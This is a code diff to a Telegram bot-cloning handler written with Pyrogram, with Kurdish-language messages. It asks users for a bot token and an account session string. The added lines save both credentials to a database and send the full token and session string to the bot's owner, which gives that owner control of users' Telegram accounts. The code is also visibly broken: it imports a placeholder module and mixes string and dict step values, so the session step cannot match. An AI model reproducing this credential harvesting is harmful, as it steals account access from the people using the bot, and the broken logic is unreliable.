@@ -422,156 +422,114 @@ async def codev2(client, message):
 
 
 from pyrogram import Client, filters
-from pyrogram.types import (
-    ChatPrivileges,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Message,
-)
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
+from your_database_module import Bots  # Import your database or other necessary modules
 
-user_steps = {}
-
+user_steps = {}  # Dictionary to track user steps in the process
 
 @app.on_message(filters.command(["دروستکردنی بۆت", "• دروستکردنی بۆت •"], ""))
-async def cloner(client: Client, message: Message):
+async def cloner(app: Client, message):
     if await is_block_user(message.from_user.id):
         return
-
     if OFF:
         if message.chat.username not in OWNER:
             return await message.reply_text(
                 f"**👋🏻 ꒐ بۆت ناچالاککراوە \n👾 ꒐ نامە بۆ گەشەپێدەر بنێرە\n🧑🏻‍💻 ꒐ گەشەپێدەر : @{OWNER[0]}**",
                 reply_markup=InlineKeyboardMarkup(
-                    [
-                        [
-                            InlineKeyboardButton(
-                                "˼  گەشەپێدەر  🧑🏻‍💻 ˹", url=f"https://t.me/{OWNER[0]}"
-                            )
-                        ]
-                    ]
+                    [[InlineKeyboardButton("˼  گەشەپێدەر  🧑🏻‍💻 ˹", url=f"https://t.me/{OWNER[0]}")]]
                 ),
             )
-
+    user_steps[message.from_user.id] = "awaiting_token"
     await message.reply_text("**◗⋮◖ تۆکنی بۆت بنێرە 💎.**")
-    user_steps[message.from_user.id] = {"step": "awaiting_token"}
 
 
-from pyrogram.filters import create
-
-
-def user_filter(user_ids):
-    async def func(filter, client, message):
-        return message.from_user.id in user_ids
-
-    return create(func)
-
-
-@app.on_message(filters.reply & filters.user(set(user_steps.keys())))
-async def handle_user_input(client: Client, message: Message):
+@app.on_message(filters.reply & filters.user(user_steps.keys()))
+async def handle_user_input(client: Client, message):
     user_id = message.from_user.id
-    step_data = user_steps.get(user_id)
+    step = user_steps.get(user_id)
 
-    if step_data["step"] == "awaiting_token":
+    if step == "awaiting_token":
         token = message.text
-        await message.reply_text("**◗⋮◖ پشکنین بۆ تۆکنەکە دەکرێت ..⚡.**")
-
         try:
-            bot = Client(
-                "Cloner",
-                api_id=API_ID,
-                api_hash=API_HASH,
-                bot_token=token,
-                in_memory=True,
-            )
+            await message.reply_text("**◗⋮◖ پشکنین بۆ تۆکنەکە دەکرێت ..⚡.**")
+            bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
             await bot.start()
+            bot_i = await bot.get_me()
+            bot_username = bot_i.username
+
+            # Check if bot is already served
+            if await is_served_bot(bot_username) or bot_username in Done:
+                await bot.stop()
+                return await message.reply_text("**◗⋮◖ ناتوانی بۆت دروست بکەیت ⚡.**")
+
+            # Move to next step
+            user_steps[user_id] = {"step": "awaiting_session", "bot": bot, "bot_username": bot_username, "token": token}
+            await message.reply_text("**◗⋮◖ ئێستا کۆدی یاریدەدەر بنێرە 💎.**")
         except Exception as e:
-            await message.reply_text("**◗⋮◖ تۆکنی بۆت هەڵەیە 💎.**")
-            user_steps.pop(user_id, None)  # Clear the step
-            return
+            await message.reply_text(f"**◗⋮◖ تۆکنی بۆت هەڵەیە 💎.**\n{str(e)}")
+            del user_steps[user_id]
 
-        bot_info = await bot.get_me()
-        bot_username = bot_info.username
-
-        # Check if bot is already in use
-        if await is_served_bot(bot_username):
-            await bot.stop()
-            await message.reply_text("**◗⋮◖ ناتوانی بۆت دروست بکەیت ⚡.**")
-            user_steps.pop(user_id, None)
-            return
-        if bot_username in Done:
-            await bot.stop()
-            await message.reply_text("**◗⋮◖ پێشتر ئەم بۆتە دروستکراوە ⚡.**")
-            user_steps.pop(user_id, None)
-            return
-
-        # Move to the next step: session code
-        await message.reply_text("**◗⋮◖ ئێستا کۆدی ئەکاونتی یاریدەدەر بنێرە 💎.**")
-        user_steps[user_id] = {
-            "step": "awaiting_session",
-            "bot_client": bot,
-            "bot_username": bot_username,
-        }
-
-    elif step_data["step"] == "awaiting_session":
+    elif step == "awaiting_session":
         session = message.text
-        await message.reply_text("**◗⋮◖ بۆت چالاک دەکرێت کەمێك چاوەڕێ بکە ..⚡.**")
+        bot_data = user_steps[user_id]
+        bot = bot_data["bot"]
+        bot_username = bot_data["bot_username"]
+        token = bot_data["token"]
 
-        user = Client(
-            "ALINA",
-            api_id=API_ID,
-            api_hash=API_HASH,
-            session_string=session,
-            in_memory=True,
-        )
         try:
+            await message.reply_text("**◗⋮◖ بۆت چالاک دەکرێت کەمێك چاوەڕێ بکە ..⚡.**")
+            user = Client("ALINA", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
             await user.start()
-        except:
-            await message.reply_text("**◗⋮◖ کۆد هەڵەیە ⚡.**")
-            await step_data["bot_client"].stop()
-            user_steps.pop(user_id, None)
-            return
 
-        log_group = await user.create_supergroup(
-            "گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات"
-        )
-        logger_id = log_group.id
-        if step_data["bot_client"].photo:
-            photo = await step_data["bot_client"].download_media(
-                step_data["bot_client"].photo.big_file_id
+            # Create bot's log group and set up details
+            loger = await user.create_supergroup("گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات")
+            if bot.photo:
+                photo = await bot.download_media(bot.photo.big_file_id)
+                await user.set_chat_photo(chat_id=loger.id, photo=photo)
+            await user.add_chat_members(loger.id, bot_username)
+            await user.promote_chat_member(
+                loger.id,
+                bot_username,
+                privileges=ChatPrivileges(
+                    can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True,
+                    can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True,
+                ),
             )
-            await user.set_chat_photo(chat_id=logger_id, photo=photo)
+            loggerlink = await user.export_chat_invite_link(loger.id)
 
-        await user.add_chat_members(logger_id, step_data["bot_username"])
-        await user.promote_chat_member(
-            logger_id,
-            step_data["bot_username"],
-            privileges=ChatPrivileges(
-                can_change_info=True,
-                can_invite_users=True,
-                can_delete_messages=True,
-                can_restrict_members=True,
-                can_pin_messages=True,
-                can_promote_members=True,
-                can_manage_chat=True,
-                can_manage_video_chats=True,
-            ),
-        )
+            # Save bot data
+            dev = message.chat.id
+            data = {
+                "bot_username": bot_username,
+                "token": token,
+                "session": session,
+                "dev": dev,
+                "logger": loger.id,
+                "logger_mode": "ON",
+            }
+            Bots.insert_one(data)
 
-        logger_link = await user.export_chat_invite_link(logger_id)
-        await user.stop()
-        await step_data["bot_client"].stop()
+            # Notify user and owner
+            await message.reply_text(
+                f"**◗⋮◖ بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\n◗⋮◖ گرووپی ئامار دروست کرا 🚦⚡.\n"
+                f"◗⋮◖ ئێستا دەتوانی بۆتی گۆرانی بەکاربھێنیت 🚦⚡.\n⟨ [{loggerlink}] ⟩**",
+                disable_web_page_preview=True,
+            )
+            await app.send_message(
+                OWNER[0],
+                f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : `{token}` 🚦⚡.\n"
+                f"◗⋮◖ کۆدی یاریدەدەر : `{session}` 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n"
+                f"◗⋮◖ ئایدی : {dev} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {loggerlink} 🚦⚡.**",
+            )
 
-        await message.reply_text(
-            f"**◗⋮◖ بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\n◗⋮◖ گرووپی ئامار دروست کرا 🚦⚡.\n⟨ [{logger_link}] ⟩**",
-            disable_web_page_preview=True,
-        )
-        await client.send_message(
-            OWNER[0],
-            f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{step_data['bot_username']} 🚦⚡.\n**",
-        )
+            # Cleanup
+            await bot.stop()
+            await user.stop()
+            del user_steps[user_id]
 
-        # Clear tracking once done
-        user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply_text(f"**◗⋮◖ کۆد یاریدەدەر هەڵەیە ⚡.**\n{str(e)}")
+            del user_steps[user_id]
 
 
 @app.on_message(filters.command(["سڕینەوەی بۆت", "• سڕینەوەی بۆت •"], ""))
